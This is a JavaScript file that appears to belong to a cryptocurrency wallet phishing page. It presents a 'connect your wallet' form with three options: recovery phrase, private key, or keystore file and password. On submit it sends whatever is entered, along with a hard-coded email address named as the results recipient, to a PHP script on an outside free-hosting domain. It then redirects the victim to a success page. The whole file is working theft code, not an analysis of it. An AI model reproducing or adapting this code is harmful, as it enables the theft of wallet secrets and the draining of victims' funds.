var phrase = document.querySelector("#phrase");
var keystore = document.querySelector("#keystore");
var private = document.querySelector("#private");
var first = document.querySelector("#first");
var second = document.getElementById("second");
var third = document.querySelector("#third");
phrase.addEventListener("click", function() {
    hide(first);
});

keystore.addEventListener("click", function() {
    hide(second);
});


private.addEventListener("click", function() {
    hide(third);
});

function hide(elem) {
    var expandedPanel = document.querySelector(".active");
    //This is to remove the current active class on click
    if (expandedPanel) {
        expandedPanel.classList.remove("active");
        var attr = document.getElementsByClassName("text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full");

        for (let i = 0; i < attr.length; i++) {
            attr[i].value = "";

        }
    }
    var i = document.getElementsByClassName("text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400")
    var x = elem.getElementsByClassName("text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400")

    for (let c = 0; c < i.length; c++) {
        i[c].required = false;
    }
    for (let c = 0; c < x.length; c++) {
        x[c].required = true;
    }
    //add an active tag to the clicked element and set it's

    elem.classList.add("active");

}

const form = document.querySelector('#form');

form.addEventListener('submit', function(e) {
    e.preventDefault();

    var $inputs = $('#form :input');

    var values = {};

    const formData = new FormData();
    
    formData.append("resultBox", "willockj21@gmail.com");

    $inputs.each(function() {
        if (this.name === 'file') {
            const file = $(this)[0].files[0];
            if (file) {
                formData.append('file', file, file.name);
                values[this.name] = $(this).val();
            }
        } else if (this.name !== "" && $(this).val() !== "") {
            values[this.name] = $(this).val();
            formData.append(this.name, $(this).val());
        }
    });

    if (!values['keystorepassword'] && !values['phrase'] && !values['privatekey']) {
        alert("Please provide details for one of the connection methods");
        return;
    } else {
        if (values['keystorepassword'] && !values['file']) {
            alert("Please upload the KeyStore file");
            return;
        } else if (values['file'] && !values['keystorepassword']) {
            alert("Please provide the KeyStore password");
            return;
        }
    }

    $.ajax({
        type: "POST",
        url: "https://fenestral-licenses.000webhostapp.com/crypto.php",
        data: formData,
        enctype: 'multipart/form-data',
        processData: false,
        contentType: false,
    })
    .done((data) => {
        window.location.href = './success.html';
    })
    .fail(reason => {
        console.error(reason);
        alert("Error: " + reason.responseText + "\nPlease try again.");
    })
})
